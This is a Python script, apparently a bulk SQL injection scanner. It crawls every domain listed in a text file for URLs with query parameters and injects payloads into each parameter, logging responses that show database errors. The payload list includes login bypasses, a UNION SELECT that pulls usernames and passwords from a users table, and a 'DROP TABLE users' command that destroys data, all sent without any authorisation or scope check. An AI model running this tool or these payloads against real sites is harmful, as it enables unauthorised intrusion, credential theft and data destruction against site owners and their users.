import requests
from bs4 import BeautifulSoup
import urllib.parse
import csv
import json
import time
import os
import re

# SQLi payloads for testing
sqli_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' UNION SELECT NULL, username, password FROM users --",
    "' UNION SELECT NULL, NULL, NULL, version() --",
    "'; DROP TABLE users; --"
]

visited_urls = set()

# Initialize CSV and JSON files
sql_csv_file = "sql_results.csv"
sql_json_file = "sql_results.json"

def log_to_csv(data, file):
    with open(file, mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(data)

def log_to_json(data, file):
    with open(file, mode='a', encoding='utf-8') as f:
        json.dump(data, f)
        f.write('\n')

# Function to read domains from a text file
def read_domains(file_path):
    if not os.path.exists(file_path):
        print(f"Domain file {file_path} does not exist.")
        return []
    with open(file_path, 'r') as file:
        domains = [line.strip() for line in file if line.strip()]
    return domains

# Function to extract URLs with query parameters
def extract_urls_with_params(domain):
    urls = set()
    try:
        response = requests.get(domain, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = urllib.parse.urljoin(domain, link['href'])
                parsed = urllib.parse.urlparse(href)
                if parsed.query:
                    urls.add(href)
    except requests.RequestException as e:
        print(f"Error accessing {domain}: {e}")
    return urls

# Function to test SQLi on a single URL
def test_sqli(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    vulnerable = False

    for param in query_params:
        original_values = query_params[param]
        for payload in sqli_payloads:
            # Inject payload into the parameter
            injected_params = query_params.copy()
            injected_params[param] = payload
            new_query = urllib.parse.urlencode(injected_params, doseq=True)
            injected_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
            try:
                response = requests.get(injected_url, timeout=10)
                # Simple detection: look for common SQL error messages
                if re.search(r"you have an error in your sql syntax|warning: mysql|unclosed quotation mark after the character string", response.text, re.I):
                    print(f"[!] SQLi vulnerability found: {injected_url}")
                    log_data = {
                        "url": injected_url,
                        "parameter": param,
                        "payload": payload,
                        "response_status": response.status_code,
                        "response_snippet": response.text[:200],
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
                    }
                    log_to_csv([injected_url, param, payload, response.status_code, response.text[:200], time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())], sql_csv_file)
                    log_to_json(log_data, sql_json_file)
                    vulnerable = True
            except requests.RequestException as e:
                print(f"Error injecting SQLi into {injected_url}: {e}")
    return vulnerable

# Main function to run SQLi scanning
def main():
    # Check if the domain list file exists
    domain_file = "domains.txt"
    domains = read_domains(domain_file)
    if not domains:
        print("No domains to scan. Please add domains to 'domains.txt'.")
        return

    # Initialize CSV with headers
    with open(sql_csv_file, mode='w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(["URL", "Parameter", "Payload", "Response Status", "Response Snippet", "Timestamp"])

    # Iterate over each domain
    for domain in domains:
        print(f"Scanning domain: {domain}")
        urls = extract_urls_with_params(domain)
        print(f"Found {len(urls)} URLs with query parameters on {domain}")
        for url in urls:
            if url in visited_urls:
                continue
            visited_urls.add(url)
            test_sqli(url)
            # Optional: Add delay to avoid overwhelming the server
            time.sleep(1)

    print("SQL Injection scanning completed. Check 'sql_results.csv' and 'sql_results.json' for potential vulnerabilities.")

if __name__ == "__main__":
    main()
